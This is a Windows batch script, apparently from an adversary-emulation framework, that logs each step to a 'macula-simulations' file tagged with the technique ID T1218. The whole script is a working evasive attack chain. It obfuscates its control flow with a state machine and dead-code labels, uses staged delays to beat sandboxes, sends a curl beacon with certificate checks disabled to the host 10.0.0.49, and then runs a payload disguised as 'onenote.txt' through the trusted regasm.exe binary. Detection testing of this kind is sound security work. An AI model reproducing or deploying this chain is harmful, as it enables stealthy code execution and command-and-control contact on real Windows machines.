@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM PHR_ constants
SET yxqtpj=%APPDATA%\8844\a3be5aaa
SET bklzhs=https://10.0.0.49
SET vdwjlp=https://10.0.0.49/stage/2/icon.png?8844-10
SET kqcnrg=ITZEL-S2BO
SET mtsvhd=10
SET frjnxt=onenote.txt
SET pzqwvb=8844

SET logfile=!APPDATA!\!mtsvhd!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: script_start>> "!logfile!" 2>nul

REM Initial delay
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: delay_45s_complete>> "!logfile!" 2>nul

REM State machine obfuscation
SET state=0
GOTO aqzsxc

:dead_rtyhjk
REM Never executed junk
SET fake=deadcode
GOTO END

:aqzsxc
IF !state!==0 GOTO xcvbdf
IF !state!==17 GOTO plmjnh
IF !state!==42 GOTO lkjhgf
IF !state!==99 GOTO END
GOTO END

:xcvbdf
REM Heartbeat - unmodified curl command
curl -k -s -o nul "!vdwjlp!"
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: heartbeat_sent>> "!logfile!" 2>nul

ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: delay_12s_complete>> "!logfile!" 2>nul
SET state=17
GOTO aqzsxc

:fake_wertyu
REM Dead code block
EXIT /B 1

:plmjnh
REM Change directory
cd /d "!yxqtpj!" >nul 2>&1
SET chdir_result=!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: chdir_result=!chdir_result!>> "!logfile!" 2>nul

SET /A randdelay=!RANDOM! %% 15 + 10
timeout /t !randdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: random_delay_!randdelay!s>> "!logfile!" 2>nul
SET state=42
GOTO aqzsxc

:junk_zxcvbn
REM More dead code
GOTO dead_rtyhjk

:lkjhgf
REM Execute regasm
SET ttp_result=0
SET ttp_error=

%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U "!frjnxt!" >nul 2>&1
IF !ERRORLEVEL!==0 (
    SET ttp_result=1
) ELSE (
    SET ttp_error=regasm_failed
)

echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: regasm_executed=!ERRORLEVEL!>> "!logfile!" 2>nul

REM TTP logging
SET timestamp=!DATE:/=-!
SET timestamp=!timestamp: =-! !TIME!
echo [!timestamp!][!kqcnrg!]: !mtsvhd!-!pzqwvb!-T1218|Regasm=!ttp_result!:!ttp_error!>> "!logfile!" 2>nul

CHOICE /C Y /N /D Y /T 8 >nul
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: delay_8s_complete>> "!logfile!" 2>nul
SET state=99
GOTO aqzsxc

:END
echo [!DATE! !TIME!][DEBUG][!kqcnrg!]: script_end>> "!logfile!" 2>nul